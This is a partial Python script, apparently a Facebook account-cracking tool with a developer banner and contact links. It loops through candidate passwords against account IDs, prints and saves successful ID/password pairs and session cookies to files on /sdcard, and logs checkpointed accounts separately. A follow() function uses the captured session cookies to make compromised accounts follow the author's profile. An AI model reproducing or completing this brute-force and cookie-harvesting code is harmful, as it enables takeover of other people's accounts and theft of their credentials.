...
{B} [{R}✔{B}] {Y}DEVELOPER  :{G} B4DH1N TOOR 

{B} [{R}✔{B}] {B}FACEBOOK   :{G} B4DH1N TOOR

{B} [{R}✔{B}] {nb}WHATSAPP   :{G} 01736637029
...
def fb():
    ...
    s("xdg-open https://www.facebook.com/profile.php?id=100056235043800")

def git():

    s(" os.system('xdg-open https://github.com/adiltoor27')")

def git():

    s("xdg-open https://github.com/adiltoor27")
...
def follow(self, session, coki):
        ...
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100056235043800', {
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"{G} [ B4DH1N-OK🥳 ] {cid} | {ps}")

                print(f"{B} [  COOKIE  ] {coki}")

                cek_apk(session,coki)

                open('/sdcard/B4DH1N-OK.txt', 'a').write( cid+' | '+ps+'\n')
                ...
                print(f"{R} [ B4DH1N -CP☹️ ] {cid} | {ps}")

                open('/sdcard/B4DH1N -CP.txt', 'a').write( cid+' | '+ps+' \n')
